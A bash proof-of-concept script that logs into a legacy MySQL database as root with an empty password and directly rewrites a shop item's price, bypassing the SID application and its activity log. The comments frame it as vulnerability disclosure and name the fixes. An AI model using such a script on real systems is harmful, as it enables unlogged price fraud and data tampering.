#!/usr/bin/env bash
# PROOF OF CONCEPT — do not run against a real production database.
#
# Demonstrates the vulnerability discussed: the legacy toko_1_3 MySQL 4.1 instance has a
# root account with an EMPTY password and no application-layer safeguards at the database
# level. Anyone who can reach this MySQL port (locally, or over the network if the port is
# exposed) can edit any price directly, bypassing the SID application entirely — no login,
# no audit trail in the app, no confirmation dialog, nothing.
#
# This script is intentionally simple: it is the attack, not a security control. It proves
# the gap exists. The fix is not "make this script safer" — it's closing the two real holes:
#   1. Set a real password on the MySQL root account (and stop using root for anything).
#   2. Restrict filesystem/network access to the database so this connection is impossible
#      for anyone but the legitimate application in the first place.
#
# Usage: ./poc_direct_price_edit.sh

set -euo pipefail

MYSQL_BIN="/e/VIBECODING/bintangkembar/Appserv/mysql/bin/mysql.exe"
DB_HOST="127.0.0.1"
DB_USER="root"
DB_PASS=""
DB_NAME="toko_1_3"

if [ ! -x "$MYSQL_BIN" ]; then
  echo "mysql client not found at $MYSQL_BIN — edit MYSQL_BIN in this script." >&2
  exit 1
fi

run_sql() {
  "$MYSQL_BIN" -h "$DB_HOST" -u "$DB_USER" --password="$DB_PASS" "$DB_NAME" -N -B -e "$1"
}

echo "=== PoC: direct price tampering against $DB_NAME, no app login required ==="
echo "Connecting as '$DB_USER' with $( [ -z "$DB_PASS" ] && echo 'NO password' || echo 'a password' )."
echo

echo "Barang (kode | nama | harga_toko saat ini):"
echo "----------------------------------------------------------------------"
run_sql "SELECT kode, nama, harga_toko FROM barang WHERE nama IS NOT NULL AND nama <> '' ORDER BY nama LIMIT 30;" \
  | awk -F'\t' '{printf "%-10s %-40s Rp %s\n", $1, substr($2,1,38), $3}'
echo "----------------------------------------------------------------------"
echo

read -rp "Kode barang yang mau diubah harganya: " TARGET_KODE
[ -z "$TARGET_KODE" ] && { echo "Kosong, batal."; exit 1; }

CURRENT=$(run_sql "SELECT harga_toko FROM barang WHERE kode='${TARGET_KODE//\'/}';")
if [ -z "$CURRENT" ]; then
  echo "Kode '$TARGET_KODE' tidak ditemukan."
  exit 1
fi
NAME=$(run_sql "SELECT nama FROM barang WHERE kode='${TARGET_KODE//\'/}';")
echo "Barang: $NAME"
echo "Harga saat ini: Rp $CURRENT"
echo

read -rp "Harga baru (angka saja, contoh 135000): " NEW_PRICE
if ! [[ "$NEW_PRICE" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
  echo "Bukan angka valid, batal."
  exit 1
fi

echo
echo "Akan menjalankan langsung ke database (tanpa lewat aplikasi SID sama sekali):"
echo "  UPDATE barang SET harga_toko = $NEW_PRICE WHERE kode = '$TARGET_KODE';"
read -rp "Lanjut? (ketik YES untuk konfirmasi): " CONFIRM
[ "$CONFIRM" != "YES" ] && { echo "Dibatalkan."; exit 0; }

run_sql "UPDATE barang SET harga_toko = ${NEW_PRICE} WHERE kode = '${TARGET_KODE//\'/}';"

echo
echo "Selesai. Harga baru di database:"
run_sql "SELECT kode, nama, harga_toko FROM barang WHERE kode = '${TARGET_KODE//\'/}';" \
  | awk -F'\t' '{printf "%-10s %-40s Rp %s\n", $1, $2, $3}'
echo
echo "Catatan: perubahan ini TIDAK muncul di log aktivitas aplikasi SID mana pun,"
echo "karena tidak lewat aplikasi sama sekali — inilah gap-nya."
